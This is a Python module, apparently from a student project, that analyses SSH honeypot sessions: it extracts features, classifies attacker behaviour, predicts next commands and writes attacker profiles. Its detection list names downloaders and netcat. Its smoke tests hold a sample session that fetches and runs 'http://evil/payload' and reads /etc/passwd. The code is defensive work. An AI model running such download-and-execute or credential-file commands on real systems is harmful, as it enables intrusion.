"""
AI-powered analysis pipeline for SSH honeypot sessions.

Drop-in module to:
 - extract features from a session (commands + metadata)
 - classify attacker behavior (rule-based + optional ML)
 - predict next commands (n-gram / Markov-style predictor)
 - generate a human-readable "hacker profile" summary

Usage examples at bottom. Save as ai_pipeline.py and import into your FakeShell file.

Notes:
 - This module tries to use sklearn if available to train/load a classifier.
 - If no labeled training data is available, it uses a robust rule-based classifier
   derived from suspicious command patterns.
 - Next-command predictor is an n-gram frequency model built from historic sessions.

Author: Generated for Nitish's project: "AI-powered hacker tracking and deception framework"
"""

from __future__ import annotations
import os
import re
import json
import time
import pickle
from collections import defaultdict, Counter, deque
from datetime import datetime
from typing import List, Dict, Any, Optional, Tuple
from pattern import PRIV_ESC_PATTERNS, DESTRUCTIVE_PATTERNS, RECON_PATTERNS, TYPOS_PATTERN

# Optional ML imports
try:
    from sklearn.ensemble import RandomForestClassifier
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.pipeline import Pipeline
    SKLEARN_AVAILABLE = True
except Exception:
    SKLEARN_AVAILABLE = False

# -------------------------
# Configuration / Patterns
# -------------------------
MALWARE_PATTERNS = [
    r"wget ", r"curl ", r"bash -c", r"curl -s", r"base64 -d",
    r"nc ", r"netcat", r"chmod \+x", r"\.\/", r"droppers",
    r"openssl", r"exec\("
]
 # common typos like 'las' for ls

# -------------------------
# Utility helpers
# -------------------------

def normalize_cmd(cmd: str) -> str:
    return re.sub(r"\s+", " ", cmd.strip())

# -------------------------
# Feature extractor
# -------------------------
class SessionFeaturesExtractor:
    """Converts a session (list of commands + metadata) to feature dicts."""

    def __init__(self):
        pass

    def extract(self, commands: List[str], metadata: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Return features dictionary from commands and optional metadata.
        commands: ordered list of strings (commands executed in session)
        metadata: dict (ip, username, duration_seconds, timestamps, etc.)
        """
        metadata = metadata or {}
        cmds = [normalize_cmd(c) for c in commands if c is not None]
        joined = " \n ".join(cmds)
        features: Dict[str, Any] = {}
        features['num_commands'] = len(cmds)
        features['unique_commands'] = len(set(cmds))
        features['avg_cmd_len'] = sum(len(c) for c in cmds) / (len(cmds) or 1)
        features['has_download'] = int(any(re.search(pat, c, re.I) for c in cmds for pat in MALWARE_PATTERNS))
        features['sudo_attempts'] = sum(1 for c in cmds if re.search(r"\bsudo\b", c))
        features['malware_pattern_hits'] = sum(1 for c in cmds for pat in MALWARE_PATTERNS if re.search(pat, c, re.I))
        features['priv_esc_hits'] = sum(1 for c in cmds for pat in PRIV_ESC_PATTERNS if re.search(pat, c, re.I))
        features['destructive_hits'] = sum(1 for c in cmds for pat in DESTRUCTIVE_PATTERNS if re.search(pat, c, re.I))
        features['recon_hits'] = sum(1 for c in cmds for pat in RECON_PATTERNS if re.search(pat, c, re.I))
        features['typo_hits'] = int(any(re.search(TYPOS_PATTERN, c, re.I) for c in cmds))
        features['first_command'] = cmds[0] if cmds else ''
        features['last_command'] = cmds[-1] if cmds else ''
        features['command_text'] = joined

        # metadata pass-through
        for k in ('ip', 'username', 'duration_seconds', 'start_time', 'end_time'):
            if k in metadata:
                features[k] = metadata[k]
        return features

# -------------------------
# Behavior classifier
# -------------------------
class BehaviorClassifier:
    """Classify session into attacker types.

    Modes:
      - rule-based (default)
      - sklearn model (if available and model file provided)
    """

    def __init__(self, model_path: Optional[str] = None):
        self.model_path = model_path
        self.mode = 'rule'
        self.pipeline = None
        if SKLEARN_AVAILABLE and model_path and os.path.exists(model_path):
            try:
                with open(model_path, 'rb') as f:
                    self.pipeline = pickle.load(f)
                self.mode = 'ml'
            except Exception:
                self.mode = 'rule'

    def predict_rule_based(self, features: Dict[str, Any]) -> Tuple[str, Dict[str, float]]:
        score = defaultdict(int)
        # Malware / downloader
        if features.get('has_download'):
            score['downloader'] += 3
        score['downloader'] += features.get('malware_pattern_hits', 0)
        # privilege escalation
        score['priv_esc'] += features.get('sudo_attempts', 0) * 3
        score['priv_esc'] += features.get('priv_esc_hits', 0)
        # destructive
        score['destructive'] += features.get('destructive_hits', 0) * 5
        # recon
        score['recon'] += features.get('recon_hits', 0)
        # noisy/inexperienced
        if features.get('typo_hits') or features.get('avg_cmd_len', 0) < 4:
            score['inexperienced'] += 2

        # Heuristics: combine
        if features.get('num_commands', 0) < 3 and features.get('has_download'):
            score['opportunistic'] += 2

        # Determine best label
        ranked = sorted(score.items(), key=lambda x: x[1], reverse=True)
        if not ranked or ranked[0][1] == 0:
            label = 'unknown'
        else:
            label = ranked[0][0]

        # build confidence map
        total = sum(score.values()) or 1
        conf = {k: v / total for k, v in score.items()}
        return label, conf

    def predict(self, features: Dict[str, Any]) -> Dict[str, Any]:
        """Return dict: {'label':..., 'confidence':..., 'mode':...}"""
        if self.mode == 'ml' and self.pipeline is not None:
            try:
                text = features.get('command_text', '')
                pred = self.pipeline.predict([text])[0]
                probs = None
                try:
                    probs = self.pipeline.predict_proba([text])[0].max()
                except Exception:
                    probs = None
                return {'label': pred, 'confidence': float(probs) if probs is not None else None, 'mode': 'ml'}
            except Exception as e:
                # fallback
                pass
        # rule mode
        label, conf_map = self.predict_rule_based(features)
        top_conf = max(conf_map.values()) if conf_map else 0.0
        return {'label': label, 'confidence': float(top_conf), 'mode': 'rule', 'conf_map': conf_map}

    # Optional training method
    def train_from_labeled_csv(self, csv_path: str, save_path: Optional[str] = None) -> bool:
        """Attempt to train a simple TF-IDF + RandomForest pipeline.
        Expected CSV: columns ['session_id', 'command_text', 'label']
        Returns True if training succeeded and model saved to save_path.
        """
        if not SKLEARN_AVAILABLE:
            return False
        import csv
        texts = []
        labels = []
        with open(csv_path, newline='', encoding='utf-8') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if 'command_text' in row and 'label' in row:
                    texts.append(row['command_text'])
                    labels.append(row['label'])
        if not texts:
            return False
        clf = Pipeline([
            ('tfidf', TfidfVectorizer(ngram_range=(1,2), max_features=5000)),
            ('clf', RandomForestClassifier(n_estimators=100, n_jobs=-1))
        ])
        clf.fit(texts, labels)
        if save_path:
            with open(save_path, 'wb') as f:
                pickle.dump(clf, f)
            self.model_path = save_path
            self.pipeline = clf
            self.mode = 'ml'
        return True

# -------------------------
# Next-command predictor
# -------------------------
class NextCommandPredictor:
    """A simple n-gram / Markov-style next-command predictor.

    Train on a list of sessions (each session is a list of commands).
    """
    def __init__(self, n: int = 3):
        self.n = n
        # mapping: history tuple -> Counter of next commands
        self.model: Dict[Tuple[str, ...], Counter] = defaultdict(Counter)
        self.unigram: Counter = Counter()

    def train(self, sessions: List[List[str]]):
        for sess in sessions:
            toks = [normalize_cmd(c) for c in sess if c is not None]
            for i, t in enumerate(toks):
                self.unigram[t] += 1
                # build contexts for 1..n-1
                for k in range(1, self.n):
                    if i - k < 0:
                        continue
                    hist = tuple(toks[i-k:i])
                    self.model[hist][t] += 1
        # No explicit smoothing needed; we will back off

    def predict_next(self, history: List[str], top_k: int = 5) -> List[Tuple[str, float]]:
        history = [normalize_cmd(c) for c in history if c is not None]
        # try longest context
        for k in range(self.n-1, 0, -1):
            if len(history) >= k:
                hist = tuple(history[-k:])
                if hist in self.model and self.model[hist]:
                    counter = self.model[hist]
                    total = sum(counter.values())
                    ranked = [(cmd, cnt/total) for cmd, cnt in counter.most_common(top_k)]
                    return ranked
        # fallback to unigram
        total = sum(self.unigram.values()) or 1
        return [(cmd, cnt/total) for cmd, cnt in self.unigram.most_common(top_k)]

# -------------------------
# Profile / Summary generator
# -------------------------
class ProfileGenerator:
    """Generate a textual hacker profile from features + classifier output + predictions."""

    def __init__(self):
        pass

    def generate(self, features: Dict[str, Any], classification: Dict[str, Any], next_cmds: List[Tuple[str, float]]) -> Dict[str, Any]:
        label = classification.get('label', 'unknown')
        conf = classification.get('confidence', 0.0)
        profile_lines = []
        # Skill estimation heuristics
        skill = 'Unknown'
        if features.get('num_commands', 0) > 30 and features.get('unique_commands', 0) > 10 and not features.get('typo_hits'):
            skill = 'Advanced'
        elif features.get('num_commands', 0) > 10:
            skill = 'Intermediate'
        else:
            skill = 'Novice'
        profile_lines.append(f"Skill Level: {skill}")
        profile_lines.append(f"Predicted Attacker Type: {label} (confidence={conf:.2f})")

        reasons = []
        if features.get('has_download'):
            reasons.append('Uses downloaders (wget/curl)')
        if features.get('sudo_attempts', 0) > 0:
            reasons.append('Attempts sudo / privilege escalation')
        if features.get('destructive_hits', 0) > 0:
            reasons.append('Destructive commands detected')
        if features.get('typo_hits'):
            reasons.append('Makes typographical mistakes - possibly inexperienced or automated tooling')
        if not reasons:
            reasons.append('No high-risk patterns detected')
        profile_lines.append('Behavior signals: ' + '; '.join(reasons))

        # Next-command summary
        if next_cmds:
            predicted_lines = [f"{i+1}. {cmd} ({prob*100:.1f}%)" for i, (cmd, prob) in enumerate(next_cmds[:5])]
            profile_lines.append('Likely next commands:')
            profile_lines.extend(predicted_lines)
        else:
            profile_lines.append('Likely next commands: No data')

        # Short recommendation
        rec = 'LOW' if label in ('unknown', 'inexperienced') else ('HIGH' if label in ('downloader','destructive','priv_esc') else 'MEDIUM')
        profile_lines.append(f'Risk Assessment: {rec}')

        text = "\n".join(profile_lines)
        return {'text': text, 'lines': profile_lines, 'risk': rec, 'skill': skill}

# -------------------------
# Pipeline wrapper
# -------------------------
class AIPipeline:
    def __init__(self, behavior_model_path: Optional[str] = None):
        self.extractor = SessionFeaturesExtractor()
        self.classifier = BehaviorClassifier(behavior_model_path)
        self.predictor = NextCommandPredictor(n=3)
        self.profile_gen = ProfileGenerator()
        self.trained_sessions: List[List[str]] = []

    def ingest_sessions_for_predictor(self, sessions: List[List[str]]):
        # sessions: list of sessions where each session is list of commands
        self.trained_sessions.extend(sessions)
        self.predictor.train(self.trained_sessions)

    def analyze_session(self, commands: List[str], metadata: Optional[Dict[str, Any]] = None, top_k_next: int = 5) -> Dict[str, Any]:
        features = self.extractor.extract(commands, metadata)
        classification = self.classifier.predict(features)
        next_cmds = self.predictor.predict_next(commands, top_k=top_k_next)
        profile = self.profile_gen.generate(features, classification, next_cmds)
        result = {
            'features': features,
            'classification': classification,
            'next_command_predictions': next_cmds,
            'profile': profile,
            'timestamp': datetime.utcnow().isoformat()
        }
        return result

# -------------------------
# Example usage & tests
# -------------------------
if __name__ == '__main__':
    # quick unit tests / smoke tests
    def run_tests():
        print('Running smoke tests for ai_pipeline...')
        sessions = [
            ['uname -a', 'whoami', 'id', 'ls -la', 'ps aux'],
            ['cd /tmp', 'wget http://evil/payload', 'chmod +x payload', './payload'],
            ['ls', 'ls', 'las', 'pwd', 'echo hello', 'cat /etc/passwd']
        ]
        ai = AIPipeline()
        ai.ingest_sessions_for_predictor(sessions)

        # test 1: downloader
        sess1 = ['cd /tmp', 'wget http://evil/payload', 'chmod +x payload', './payload']
        res1 = ai.analyze_session(sess1, metadata={'ip':'127.0.0.1', 'username':'admin'})
        print('\n---- Test 1 ----')
        print('Label:', res1['classification']['label'])
        print(res1['profile']['text'])

        # test 2: recon
        sess2 = ['uname -a', 'whoami', 'ps aux']
        res2 = ai.analyze_session(sess2)
        print('\n---- Test 2 ----')
        print('Label:', res2['classification']['label'])
        print(res2['profile']['text'])

        # test 3: typo 'las'
        sess3 = ['las', 'pwd', 'echo hi']
        res3 = ai.analyze_session(sess3)
        print('\n---- Test 3 ----')
        print('Label:', res3['classification']['label'])
        print(res3['profile']['text'])

    run_tests()

""
